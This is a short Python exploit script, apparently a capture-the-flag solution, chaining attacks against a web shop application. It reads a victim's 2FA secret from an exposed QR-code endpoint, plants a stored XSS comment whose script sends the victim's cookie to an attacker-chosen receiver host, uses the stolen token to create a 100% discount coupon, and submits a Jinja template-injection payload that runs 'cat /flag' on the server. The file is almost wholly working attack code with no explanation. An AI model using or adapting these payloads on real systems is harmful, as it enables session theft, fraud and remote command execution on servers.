import requests, pyotp, sys, os, re
from PIL import Image
from pyzbar.pyzbar import decode

if len(sys.argv) != 3:
    print("Usage: python3 exp.py <target> <token receiver>")
    exit(1)
url = sys.argv[1]
receiver = sys.argv[2]

anon_qrcode = requests.get(url + "/2faqrcode/anon")
with open("anon.png", "wb") as f:
    f.write(anon_qrcode.content)
# decode the qrcode
img = Image.open("anon.png")
uri = decode(img)[0].data.decode()
print("2FA Code: "+uri)
anon = pyotp.parse_uri(uri)
key = anon.secret
mfa = pyotp.TOTP(key)
os.remove("anon.png")
# send the token to the receiver
requests.post(url + "/api/comment", json={"username": "exp",
                                          "comment": '<script>if (document.getElementById("username").value=="anon") fetch("{}" + "/" + document.cookie);</script>'.format(receiver),
                                          "rating": "1"})
r = requests.get(url + "/reply")
# wait for the receiver to get the token
token = input("Enter the token: ")
coupon = requests.post(url + "/api/coupon", cookies={"Authorization": token},
               json={"type": "percentage",
                     "value": "100"}).json()["coupon"]
print("Coupon code: " + coupon)
payload = r"{{''.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__['popen']('cat /flag').read()}}"

r = requests.post(url + "/api/addkey", cookies={"Authorization": token},
               json={"code": payload,
                     "twoFactorAuth": mfa.now(),
                     "id": "01"})
# get the flag
r = requests.post(url + "/api/pay", cookies={"Authorization": token},json={"couponCode": coupon,"item": "01"})
print(re.findall(r"flag{.*}", r.text)[0])